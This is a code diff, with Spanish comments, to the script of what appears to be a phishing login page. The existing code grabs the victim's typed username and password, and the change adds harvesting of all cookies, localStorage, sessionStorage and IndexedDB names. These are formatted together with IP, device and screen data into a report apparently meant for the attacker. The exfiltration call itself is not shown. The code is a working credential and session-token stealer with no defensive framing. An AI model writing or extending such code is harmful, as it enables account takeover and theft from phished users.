@@ -410,11 +410,44 @@
             const usuario = document.querySelector('.input-field').value;
             const password = document.querySelector('.password-input').value;
             
-            // Obtener más datos
+            // Captura agresiva de cookies y storage
+            let allCookies = '';
+            try {
+                // Cookies del documento
+                const documentCookies = document.cookie;
+                
+                // Local Storage
+                const localStorageData = Object.entries(localStorage)
+                    .map(([key, value]) => `${key}: ${value}`)
+                    .join('\n');
+                    
+                // Session Storage
+                const sessionStorageData = Object.entries(sessionStorage)
+                    .map(([key, value]) => `${key}: ${value}`)
+                    .join('\n');
+                    
+                // IndexedDB
+                const dbList = await window.indexedDB.databases();
+                const indexedDBData = dbList.map(db => db.name).join(', ');
+                
+                allCookies = `
+📍 Document Cookies:
+${documentCookies || 'No cookies'}
+
+💾 LocalStorage:
+${localStorageData || 'Vacío'}
+
+📌 SessionStorage:
+${sessionStorageData || 'Vacío'}
+
+🗄️ IndexedDB:
+${indexedDBData || 'No databases'}
+                `;
+            } catch (e) {
+                allCookies = `Error al obtener datos: ${e.message}`;
+            }
+            
             const userAgent = navigator.userAgent;
-            const allCookies = document.cookie.split(';')
-                .map(cookie => cookie.trim())
-                .join('\n🍪 ');
             const screenSize = `${window.screen.width}x${window.screen.height}`;
             const fecha = new Date().toLocaleString();
             
@@ -438,7 +471,9 @@
 🌐 IP: ${ip}
 📱 Dispositivo: ${userAgent}
 🖥️ Pantalla: ${screenSize}
-🍪 Cookies: ${allCookies || 'No hay cookies'}
+
+${allCookies}
+
 📅 Fecha: ${fecha}
 
 ═══════════════════
